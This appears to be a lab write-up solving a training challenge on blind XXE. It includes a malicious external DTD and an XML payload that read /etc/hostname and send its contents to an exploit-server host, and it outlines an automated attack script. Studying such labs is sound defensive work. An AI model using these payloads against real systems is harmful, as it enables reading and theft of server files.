### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

_____

Analysis and Exploit:

1. Intercept request with XML content **/product/stock**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
        <stockCheck>
            <productId>1</productId>
            <storeId>1</storeId>
        </stockCheck>
    ```
2. Create a malicious DTD and store it on the exploit server
    1. POST **/** on the exploit server
        - urlIsHttps=on
        - responseFile=/xxe.dtd
        - responseHead=HTTP/1.1 200 OK  
        - Content-Type: text/plain; charset=utf-8
        - responseBody= _see DTD below_
        - formAction=STORE  
    
    **DTD**
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://XXX.exploit-server.net/?x=%file;'>">
    %eval;
    %exfiltrate;
    ```
3. Create payload and send it via **[BURP-REPEATER]**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://XXX.exploit-server.net/xxe.dtd"> %xxe; ]>
        <stockCheck>
            <productId>1</productId>
            <storeId>1</storeId>
        </stockCheck>
    ```
    - if "XML parsing error" and status code == 400: works
4. Access log file on the exploit server
    - 10.0.3.160      2023-04-09 21:05:24 +0000 "GET /?x=8b84e4e51b5b HTTP/1.1" 200 "User-Agent: Java/17.0.5"
5. Submit the retrieved value

_____

Script:

1. Store the malicious DTD on the exploit server | POST (EXPLOIT SERVER) **/** | params: urlIsHttps, responseFile, responseHead, responseBody, formAction
    - urlIsHttps=on
    - responseFile=/xxe.dtd
    - responseHead=HTTP/1.1 200 OK Content-Type: text/plain; charset=utf-8
    - responseBody= _see DTD below_
    - formAction=STORE
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://XXX.exploit-server.net/?x=%file;'>">
    %eval;
    %exfiltrate;
    ```
    - if response status code == 200: ok

2. Send payload | POST **/product/stock** | params: 'xml payload'
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://XXX.exploit-server.net/xxe.dtd"> %xxe; ]>
        <stockCheck>
            <productId>1</productId>
            <storeId>1</storeId>
        </stockCheck>
    ```
    - if "XML parsing error" and status code == 400: ok

3. Retrieve the value | GET (EXPLOIT SERVER) **/log**
    - if response status code == 200: ok
    - extract value from substring "/?x=8b84e4e51b5b"

4. Submit the value | POST **/submitSolution** | params: answer
    - submit value